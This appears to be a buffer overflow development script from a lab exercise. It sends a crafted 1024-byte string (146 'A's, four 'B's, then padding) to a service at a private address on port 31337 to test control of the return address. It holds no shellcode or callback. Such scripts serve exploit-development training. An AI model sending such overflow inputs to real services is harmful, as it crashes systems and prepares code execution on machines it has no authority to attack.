#!/usr/bin/env python2
import socket
#setup the ip and port we are connecting to 
RHOST = "192.168.0.120"
RPORT = 31337
#create a tcp connection (socket)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST,RPORT))
buf = ""
buf +="A"*146+"B"*4+"C"*(1024-146-4)
buf += "\n"
s.send(buf)
s.close()
